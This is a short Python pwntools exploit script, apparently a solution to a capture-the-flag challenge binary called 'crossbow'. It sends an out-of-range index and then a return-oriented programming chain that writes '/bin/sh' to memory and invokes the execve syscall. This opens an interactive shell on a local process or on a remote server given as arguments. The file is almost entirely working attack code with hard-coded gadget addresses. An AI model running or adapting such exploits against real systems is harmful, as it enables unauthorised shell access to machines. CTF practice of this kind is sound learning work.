from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *target_dummy
b *0x401218
b *0x40127D
b *0x40136C
continue
'''.format(**locals())

exe = './crossbow' #change this
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()

p.sendlineafter(b"shoot: ", f"{-2}".encode())

pop_rdi = 0x0000000000401d6c
pop_rsi = 0x000000000040566b
pop_rdx = 0x0000000000401139
pop_rax = 0x0000000000401001
syscall = 0x00000000004015d3
mov_qword_ptr_rdi_rax = 0x00000000004020f5
rw_section = 0x40d840

rop = [p64(0), p64(pop_rdi),
p64(rw_section), p64(pop_rax),
b"/bin/sh\x00", p64(mov_qword_ptr_rdi_rax),
p64(pop_rsi), p64(0),
p64(pop_rdx), p64(0),
p64(pop_rax), p64(59),
p64(syscall)]

payload = flat(rop)
p.sendlineafter(b"warcry!!\n\n> ", payload)

p.interactive()
